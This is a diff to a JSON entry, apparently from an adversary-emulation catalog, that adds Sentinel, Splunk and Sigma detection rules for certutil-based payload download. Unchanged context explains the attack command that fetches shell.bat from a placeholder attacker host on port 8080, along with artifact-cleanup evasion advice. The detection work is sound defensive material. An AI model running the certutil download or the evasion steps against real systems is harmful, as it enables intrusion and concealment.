@@ -85,7 +85,65 @@
       "MITRE T1105",
       "MITRE T1140"
     ],
-    "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create."
+    "evasion": "Touch only what you need; remove any scheduled task/mounted disk/dropped file you create.",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Misc - certutil File Transfer & Encoding - Sentinel",
+        "logic": "DeviceProcessEvents\n| where FileName =~ \"certutil.exe\" and ProcessCommandLine has_any (\"-urlcache\",\"-split\",\"http\")\n| project Timestamp, DeviceName, AccountName, ProcessCommandLine\n| union (DeviceNetworkEvents | where InitiatingProcessFileName =~ \"certutil.exe\" | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, ProcessCommandLine=RemoteUrl)\n| sort by Timestamp desc",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Misc - certutil File Transfer & Encoding (1) - Splunk",
+        "logic": "index=sysmon EventCode=1 Image=\"*certutil.exe\" (CommandLine=\"*-urlcache*\" OR CommandLine=\"*-split*\" OR CommandLine=\"*http*\")\n| table _time, Computer, User, CommandLine",
+        "data_source": "sysmon",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "1"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "Misc - certutil File Transfer & Encoding (2) - Splunk",
+        "logic": "index=sysmon EventCode=3 Image=\"*certutil.exe\"\n| table _time, Computer, DestinationIp, DestinationPort",
+        "data_source": "sysmon",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "3"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "proc_creation_win_lolbin_certutil_download",
+        "logic": "proc_creation_win_lolbin_certutil_download",
+        "data_source": "sysmon",
+        "attack": [
+          "T1105"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "defender-endpoint",
+        "sysmon"
+      ]
+    }
   },
   "explain": "Uses the certutil LOLBAS to download a payload over HTTP:\n  certutil.exe -urlcache   use the URL cache download function\n  -split                   split/handle the cached file\n  -f                       force overwrite of any cached copy\n  http://<lhost>:8080/shell.bat shell.bat   the source URL and local output name\nA living-off-the-land way to fetch tools past filters; certutil can also base64 encode/decode to smuggle payloads."
 }
